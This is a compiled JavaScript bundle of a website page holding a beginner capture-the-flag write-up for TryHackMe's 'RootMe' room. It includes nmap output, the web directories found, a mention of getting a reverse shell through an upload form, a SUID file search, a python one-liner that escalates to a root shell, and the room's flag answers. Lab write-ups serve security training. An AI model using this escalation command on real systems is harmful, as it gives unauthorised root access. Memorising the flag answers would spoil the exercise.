"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[9835],{3905:(e,n,t)=>{t.d(n,{Zo:()=>u,kt:()=>d});var r=t(67294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var l=r.createContext({}),p=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},u=function(e){var n=p(e.components);return r.createElement(l.Provider,{value:n},e.children)},c="mdxType",h={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,a=e.originalType,l=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),c=p(t),m=o,d=c["".concat(l,".").concat(m)]||c[m]||h[m]||a;return t?r.createElement(d,i(i({ref:n},u),{},{components:t})):r.createElement(d,i({ref:n},u))}));function d(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var a=t.length,i=new Array(a);i[0]=m;var s={};for(var l in n)hasOwnProperty.call(n,l)&&(s[l]=n[l]);s.originalType=e,s[c]="string"==typeof e?e:o,i[1]=s;for(var p=2;p<a;p++)i[p]=t[p];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},7722:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>h,frontMatter:()=>a,metadata:()=>s,toc:()=>p});var r=t(87462),o=(t(67294),t(3905));const a={},i="RootMe",s={unversionedId:"Tryhackme/RootMe/RootME",id:"Tryhackme/RootMe/RootME",title:"RootMe",description:"A ctf for beginners, can you root me?",source:"@site/writeups/Tryhackme/RootMe/RootME.md",sourceDirName:"Tryhackme/RootMe",slug:"/Tryhackme/RootMe/",permalink:"/writeups/Tryhackme/RootMe/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Reversing ELF",permalink:"/writeups/Tryhackme/Reversing ELF/"},next:{title:"SSRF",permalink:"/writeups/Tryhackme/SSRF/"}},l={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Deploy the machine",id:"deploy-the-machine",level:2},{value:"Reconnaissance",id:"reconnaissance",level:2},{value:"Getting a shell",id:"getting-a-shell",level:2},{value:"Privilege escalation",id:"privilege-escalation",level:2}],u={toc:p},c="wrapper";function h(e){let{components:n,...t}=e;return(0,o.kt)(c,(0,r.Z)({},u,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"rootme"},"RootMe"),(0,o.kt)("p",null,"A ctf for beginners, can you root me?"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/rrootme"},"RootMe")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Abusing SUID/GUID")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"deploy-the-machine"},"Deploy the machine"),(0,o.kt)("p",null,"Connect to TryHackMe network and deploy the machine. If you don't know how to do this, complete the OpenVPN room first."),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Deploy the machine")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("h2",{id:"reconnaissance"},"Reconnaissance"),(0,o.kt)("p",null,"First, let's get information about the target."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/RootMe$ sudo nmap -A -Pn -sC -sV -O 10.10.16.101\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 13:09 CEST\nNmap scan report for 10.10.16.101\nHost is up (0.038s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)\n|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)\n|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: HackIT - Home\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/4%OT=22%CT=1%CU=36022%PV=Y%DS=2%DC=T%G=Y%TM=5F79AD9\nOS:6%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11\nOS:NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(\nOS:R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8888/tcp)\nHOP RTT      ADDRESS\n1   37.33 ms 10.8.0.1\n2   37.59 ms 10.10.16.101\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.41 seconds\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Scan the machine, how many ports are open?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"2")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"What version of Apache are running?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"2.4.29")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"What service is running on port 22?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"SSH")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"Find directories on the web server using the GoBuster tool.")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"http://10.10.16.101/panel/"},"http://10.10.16.101/panel/")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"http://10.10.16.101/uploads/"},"http://10.10.16.101/uploads/"))),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"What is the hidden directory?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"/panel/")),(0,o.kt)("h2",{id:"getting-a-shell"},"Getting a shell"),(0,o.kt)("p",null,"Find a form to upload and get a reverse shell, and find the flag."),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"user.txt")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{y0u_g0t_a_sh3ll}")),(0,o.kt)("h2",{id:"privilege-escalation"},"Privilege escalation"),(0,o.kt)("p",null,"Now that we have a shell, let's escalate our privileges to root."),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Search for files with SUID permission, which file is weird?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"bash-4.4$ find / -user root -perm /4000 2> /dev/null\nfind / -user root -perm /4000 2> /dev/null\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/snapd/snap-confine\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/bin/traceroute6.iputils\n/usr/bin/newuidmap\n/usr/bin/newgidmap\n/usr/bin/chsh\n/usr/bin/python\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/pkexec\n/snap/core/8268/bin/mount\n/snap/core/8268/bin/ping\n/snap/core/8268/bin/ping6\n/snap/core/8268/bin/su\n/snap/core/8268/bin/umount\n/snap/core/8268/usr/bin/chfn\n/snap/core/8268/usr/bin/chsh\n/snap/core/8268/usr/bin/gpasswd\n/snap/core/8268/usr/bin/newgrp\n/snap/core/8268/usr/bin/passwd\n/snap/core/8268/usr/bin/sudo\n/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core/8268/usr/lib/openssh/ssh-keysign\n/snap/core/8268/usr/lib/snapd/snap-confine\n/snap/core/8268/usr/sbin/pppd\n/snap/core/9665/bin/mount\n/snap/core/9665/bin/ping\n/snap/core/9665/bin/ping6\n/snap/core/9665/bin/su\n/snap/core/9665/bin/umount\n/snap/core/9665/usr/bin/chfn\n/snap/core/9665/usr/bin/chsh\n/snap/core/9665/usr/bin/gpasswd\n/snap/core/9665/usr/bin/newgrp\n/snap/core/9665/usr/bin/passwd\n/snap/core/9665/usr/bin/sudo\n/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core/9665/usr/lib/openssh/ssh-keysign\n/snap/core/9665/usr/lib/snapd/snap-confine\n/snap/core/9665/usr/sbin/pppd\n/bin/mount\n/bin/su\n/bin/fusermount\n/bin/ping\n/bin/umount\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"/usr/bin/python")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"Find a form to escalate your privileges.")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"root.txt")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"bash-4.4$ /usr/bin/python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n/usr/bin/python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n# whoami\nwhoami\nroot\n# cat /root/root.txt\ncat /root/root.txt\nTHM{pr1v1l3g3_3sc4l4t10n}\n#\n")))}h.isMDXComponent=!0}}]);